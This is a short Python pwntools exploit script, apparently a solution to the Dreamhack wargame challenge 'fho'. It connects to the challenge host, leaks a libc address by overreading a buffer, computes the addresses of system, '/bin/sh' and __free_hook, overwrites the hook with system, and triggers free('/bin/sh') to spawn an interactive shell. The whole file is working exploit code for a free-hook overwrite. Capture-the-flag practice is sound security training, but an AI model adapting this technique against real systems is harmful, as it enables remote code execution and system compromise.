from pwn import *

# nc host1.dreamhack.games 12960
p = remote("host1.dreamhack.games", 12960)
# p = process("./fho")
e = ELF("./fho")

# free hook offset : 0x3c67a8

pay = b""
pay += b"A" * 0x48

p.sendafter("Buf: ", pay)
p.recvuntil(pay)
libc_start_main = u64(p.recv(6).ljust(8, b"\x00"))
print(hex(libc_start_main))

libc_base = libc_start_main - 0x021bf7
system = libc_base + 0x4f550
binsh = libc_base + 0x1b3e1a
free_hook = libc_base + 0x3ed8e8

p.sendlineafter("write: ", str(free_hook))
p.sendlineafter("With: ", str(system))

p.sendlineafter("free: ", str(binsh))

p.interactive()